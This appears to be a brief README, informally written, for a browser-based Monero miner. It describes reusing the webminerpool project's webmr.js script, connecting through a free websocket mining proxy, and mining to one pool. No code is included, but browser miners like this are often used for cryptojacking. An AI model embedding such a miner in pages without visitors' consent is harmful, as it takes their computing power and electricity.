# How It Works ?
- It Is Created By `https://github.com/notgiven688/webminerpool` Repo Basicaly
- I Tooked `SDK/miner_compressed/webmr.js` Script And Used It As Index JS
- I Searched The Whole Internet And Atlest I Found A Free Hosted Server By `monerominer.rocks` And Then Picked It To Use It As `wss://f.xmrminingproxy.com:8181`
- It Currently Only Support One Pool That Is `moneroocean.steam` That Is Very Good Pool
